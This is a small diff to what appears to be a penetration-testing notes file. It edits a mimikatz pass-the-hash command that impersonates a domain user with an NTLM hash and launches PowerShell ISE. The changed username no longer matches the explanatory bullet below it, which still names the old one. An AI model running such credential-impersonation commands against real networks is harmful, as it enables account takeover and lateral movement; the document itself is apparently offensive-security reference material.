@@ -4,7 +4,7 @@ If you have the NTLM hash of a user, you can switch to that user context using M
 
 - **Command:**
   ```plaintext
-  mimikatz.exe "sekurlsa::pth /user:mmu7 /domain:glb.com /ntlm:<hash> /run:powershell_ise.exe"
+  mimikatz.exe "sekurlsa::pth /user:m60 /domain:glb.com /ntlm:<hash> /run:powershell_ise.exe"
   ```
 
   - `/user:mmu7`: The userne you want to impersonate.
